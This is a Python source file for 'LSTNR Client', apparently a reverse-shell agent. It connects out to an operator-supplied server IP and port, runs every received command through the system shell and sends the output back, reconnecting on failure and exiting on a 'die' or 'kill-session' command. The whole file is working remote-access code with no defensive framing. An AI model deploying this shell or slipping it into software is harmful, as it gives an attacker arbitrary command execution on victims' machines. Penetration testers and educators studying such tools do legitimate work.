import socket
import subprocess
import sys
import time
import argparse

# Default reconnect delay
RECONNECT_DELAY = 5
MAX_RETRIES = 5  # Maximum number of reconnection attempts

# Function to display usage information
def usage():
    print("Usage: python3 client.py -s <server_ip> -p <server_port>")
    sys.exit(1)

# Parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description='LSTNR Client')
    parser.add_argument('-s', '--server', type=str, required=True, help='Server IP address to connect to')
    parser.add_argument('-p', '--port', type=int, required=True, help='Server port to connect to')
    return parser.parse_args()

# Function to execute a command and return output
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        return output
    except Exception as e:
        return f"Error executing command: {e}"

# Main loop
def main():
    args = parse_arguments()
    server = args.server
    port = args.port

    retries = 0  # Count the number of reconnection attempts

    while retries < MAX_RETRIES:
        # Create a TCP connection to the server
        try:
            sock = socket.create_connection((server, port))
            print(f"[+] Connected to {server}:{port}")
            retries = 0  # Reset retries on successful connection
        except Exception as e:
            retries += 1
            print(f"[-] Connection failed ({retries}/{MAX_RETRIES}): {e}")
            if retries >= MAX_RETRIES:
                print("[-] Maximum retry limit reached. Exiting...")
                sys.exit(1)
            time.sleep(RECONNECT_DELAY)
            continue

        # Keep the connection open and listen for commands
        while True:
            try:
                command = sock.recv(1024).decode('utf-8').strip()
                if not command:
                    continue

                print(f"[*] Received command: {command}")

                # If the 'die' or 'kill-session' command is received, exit
                if command.lower() == "die" or command.lower() == "kill-session":
                    print("[!] Received kill-session command. Shutting down...")
                    sock.send(b"EOF\n")
                    sock.close()  # Close the socket
                    sys.exit(0)  # Exit the script

                # Execute the command and capture the output
                output = execute_command(command)

                # Send the output back to the server, appending EOF marker
                sock.send(f"{output}\nEOF\n".encode())
            except Exception as e:
                print(f"[-] Error receiving or sending data: {e}")
                break

        # Close the connection if the loop exits
        print("[*] Connection closed")
        sock.close()

        # Increment retry count and check the limit
        retries += 1
        if retries >= MAX_RETRIES:
            print("[-] Maximum retry limit reached. Exiting...")
            sys.exit(1)

        # Reconnect after the delay
        print(f"[*] Reconnecting in {RECONNECT_DELAY} seconds...")
        time.sleep(RECONNECT_DELAY)

if __name__ == '__main__':
    main()
